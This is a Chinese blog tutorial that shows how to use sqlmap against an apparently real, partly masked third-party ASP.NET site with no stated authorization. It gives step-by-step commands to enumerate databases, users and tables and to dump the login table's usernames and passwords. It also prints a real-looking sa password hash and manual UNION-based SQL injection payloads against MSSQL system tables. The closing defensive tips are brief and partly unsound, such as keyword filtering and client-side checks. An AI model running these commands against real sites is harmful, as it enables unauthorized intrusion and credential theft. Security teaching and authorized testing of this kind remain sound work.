
# [渗透&攻防] 二.SQL MAP工具从零解读数据库及基础用法 - 杨秀璋的专栏 - CSDN博客

2017年07月18日 00:29:29[Eastmount](https://me.csdn.net/Eastmount)阅读数：3108


这是最近学习渗透和网站攻防的文章，希望能深入地学习这部分知识，自己作为一个初学者，前一篇文章从数据库原理解读了防止SQL注入，这篇文章通过SQLMAP工具简单介绍SQL注入及用法。自己仍在慢慢探索网络攻防和渗透，希望文章对你有所帮助，尤其是学习网络安全的初学者，如果文章中存在错误或不足之处，还请海涵~
一.SQLMAP介绍
1.基础介绍
2.安装过程
3.漏洞检测
二.SQLMAP基础用法
1.获取所有数据库
2.获取当前数据库
3.获取数据库所有用户
4.获取数据库当前用户
5.获取数据库所有用户和密码
6.获取数据库所有表
7.获取数据库登录表所有字段
8.获取数据库登录表用户名和密码
三.总结

前文欣赏：
[[渗透&攻防] 一.从数据库原理学习网络攻防及防止SQL注入](http://blog.csdn.net/eastmount/article/details/75000575)
强推文章：
[渗透测试工具sqlmap基础教程 - zgyulongfei](http://blog.csdn.net/zgyulongfei/article/details/41017493/)


## 一. SQLMAP介绍
**1.基础介绍**
sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. It comes with a powerful detection engine, many niche features for the ultimate penetration tester and a broad range of switches lasting from database fingerprinting, over data fetching from the database, to accessing the underlying file system and executing commands on the operating system via out-of-band connections.

SQLMAP是一款非常强大的开源渗透测试工具，用于自动检测和利用SQL注入漏洞控制数据库服务器的过程。它配备了一个强大的检测引擎，由Python语言开发完成，通过外部连接访问数据库底层文件系统和操作系统，并执行命令实现渗透。
**2.安装过程**
由于它是通过Python语言开发完成，需要安装Python环境，下面开始安装SQLMAP。
方法一：调用Pyhon命令pip install sqlmap安装

![](https://img-blog.csdn.net/20170716004350512)
方法二：从Github中获取SQLMAP进行安装
下载地址：[https://github.com/sqlmapproject/sqlmap ](https://github.com/sqlmapproject/sqlmap)

**3.漏洞检测**
cd去到Python环境sqlmap文件夹下，运行命令：

```python
python sqlmap.py -u "http://..../tztgxx.aspx?code=115"
```
运行结果如下图所示，-u表示网址url。
![](https://img-blog.csdn.net/20170716225257373)
输出GET的四种注入类型，分别为：boolean-based blind、stacked queries、time-based blind、UNION query。这里你可能会发现和我们的第一篇文章手动讲解SQL注入类似，包括：AND 1327=1327、UNION ALL等。

![](https://img-blog.csdn.net/20170716225613772)
输出结果：
(1) 操作系统：Windows 2000
(2) Web应用技术：ASP.NET，ASP.NET 2.0,  Microsoft IIS 5.0
(3) 数据库：Microsoft SQL Server 2000
下面通过一个实例进行讲解SQLMAP的基础用法。


## 二. SQLMAP基础用法
SQLMAP的基础用法和前面基础文章类似，都是通过漏洞和SQL语句获取相关信息，具体用法如下：
**1.获取所有数据库**
参数：--dbs
命令：

```python
python sqlmap.py -u "http://.../tztgxx.aspx?code=115" --dbs
```
运行结果如下图所示，获取9个数据库，其中--dbs参数表示databases。
![](https://img-blog.csdn.net/20170717222459720)

**2.获取当前数据库**
参数：--current-db
命令：
```python
python sqlmap.py -u "http://.../tztgxx.aspx?code=115" --current-db
```
运行结果如下图所示，获取9个数据库。其中--current-db参数表示当前数据库，相当于前文MSSQL的db_name()获取数据库字段。
![](https://img-blog.csdn.net/20170717224136654)

输出结果：akykd_new
对应前文：
http://xxxxx/show.asp?code=-1' union all
select 1,null,3,null,null,6,host_name(),@@version,db_name(),10 --
输出结果如下所示：
附件3：ahykd_new
其中数据库的名称就是ahykd_new，接下来相同的道理获取数据库所有表及列。

**3.获取数据库所有用户**
参数：--users
命令：
```python
python sqlmap.py -u "http://.../tztgxx.aspx?code=115" --users
```
运行结果如下图所示，获取2个用户库。
![](https://img-blog.csdn.net/20170717224223045)
输出结果：两个用户
(1)BUILTIN\\Adminstrators
(2)sa

**4.****获取数据库当前用户**
参数：--current-user
命令：
```python
python sqlmap.py -u "http://.../tztgxx.aspx?code=115" --current-user
```
运行结果如下图所示，获取当前数据库用户sa。
![](https://img-blog.csdn.net/20170717224639352)

**5.****获取数据库所有用户和密码**
参数：--passwords
命令：
```python
python sqlmap.py -u "http://.../tztgxx.aspx?code=115" --passwords
```
运行结果如下图所示，获取数据库用户和密码。
![](https://img-blog.csdn.net/20170717225556128)
输出结果：
database management system users password hashes:
[*] BUILTIN\\Administrators [1]:
password hash: NULL
[*] sa [1]:
password hash: 0x01006e27653a36bbc7907ec45a0060e0c5065ea5172f249faa73ba704d1440b4ec497e552b6c1c27a6a34b7f575b

**6.****获取数据库所有表**
参数：-Dahykd_new--tables
命令：
```python
python sqlmap.py -u "http://.../tztgxx.aspx?code=115" -D ahykd_new --tables
```
运行结果如下图所示，获取数据库ahykd_new的所有表，其中-D表示数据库，--tables表示所有表。
![](https://img-blog.csdn.net/20170717230331343)
通过人为猜解，知道登陆表位usr。
对应前文：
http://xxxxx/show.asp?code=-1' union all
select1,null,3,null,null,6,7,8,
(select top 1 name from sysobjects where type='U'),10 --
输出结果如下所示：
附件1：7
附件2：8
附件3：kc_jxjd
其中top 1 name用于输出1个字段，sysobjects中u为用户表。

**7.****获取数据库登录表所有字段**
参数：-D ahykd_new -T usr --columns
命令：
```python
python sqlmap.py -u "http://.../tztgxx.aspx?code=115" -D ahykd_new -T usr --columns
```
运行结果如下图所示，获取数据库ahykd_new的登录表usr所有字段，其中-D表示数据库，-T表示表，--columns表示usr表所有列。
![](https://img-blog.csdn.net/20170717231022805)
![](https://img-blog.csdn.net/20170717231045930)

是不是感觉到了SQLMAP的强大，其中用户名usr_name、密码passwd。
对应前文：
http://xxxxx/show.asp?code=-1' union all
select1,null,3,null,null,6,7,8,
(select top 1 name from syscolmns where id=object_id('usr')),10 --
输出结果如下所示：
附件1：7
附件2：8
附件3：answer
其中top 1 name用于输出1个字段，表usr的一个列表。

**8.****获取数据库登录表用户名和密码**
参数：-D ahykd_new -T usr -C "usr_name,password" --dump
命令：
```python
python sqlmap.py -u "http://.../tztgxx.aspx?code=115" -D ahykd_new -T usr -C
```
```python
"usr_name,password" --dump
```
获取数据库ahykd_new的登录表usr所有字段，其中-D表示数据库，-T表示表，-C表示输出字段（usr_name、passwd），--dump输出所有值。
![](https://img-blog.csdn.net/20170717232839642)

如果字段内容太多，可以设置输出个数，如10个用户名和密码。
参数：-D ahykd_new -T usr -C "usr_name,passwd" --start 1 --stop 10 --dump
命令：

```python
python sqlmap.py -u "http://.../tztgxx.aspx?code=115" -D ahykd_new -T usr -C "usr_name,passwd" --start 1 --stop 10 --dump
```
输出结果为空，报警告“the SQL query provided does not return any output”。
![](https://img-blog.csdn.net/20170717232900561)
正常的输出结果例如下图所示，再通过md5解密即可。
![](https://img-blog.csdn.net/20141112100610793?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvemd5dWxvbmdmZWk=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast)


## 三. 总结
真正的困难在于如何找到一个存在漏洞的网站，如何去防护。现在很多网站都应做好相关防御措施，手工SQL注入是没有反应的，但是找到漏洞后，再利用SQLMAP就能够找到相应的用户名和密码。
参考前文，个人理解的防御措施：
1.在URL设置不允许非法字符，如单引号、等号、注释--、减号，提示非法参数；
2.在URL设置不允许SQL常见的关键词，如and、select、or、insert等；
3.传递的id=115参数必须为数字才能正常跳转，否则跳转错误；
4.服务器启用SQL注入拦截功能，提示当前网页的 URL / POST / COOKIES中包含了特定的 SQL字符而被防火墙拦截，因为可能通过POST、Cookies进行攻击，各方面都需要做到防御。
5.可以使用JS在客户端进行不安全字符屏蔽，也可以在jsp中调用该函数检查是否包函非法字符，或使用正则表达式过滤传入的参数，防止SQL从URL注入。
希望文章对你有所帮助，尤其是网络安全的程序员，因为系列文章是和前文息息相关的，所以看着有些凌乱。如果文章存在错误或不足之处，还请海涵。感谢娜师傅的一路陪伴，学中文的扔掉了手中的尤克里里，教我写代码也是很疯狂的啊，哈哈！不忘初心，继续前行。加油，秀璋。绿妖，晚安！
(By:Eastmount 2017-07-17 晚上12点[http://blog.csdn.net/eastmount/](http://blog.csdn.net/eastmount/))



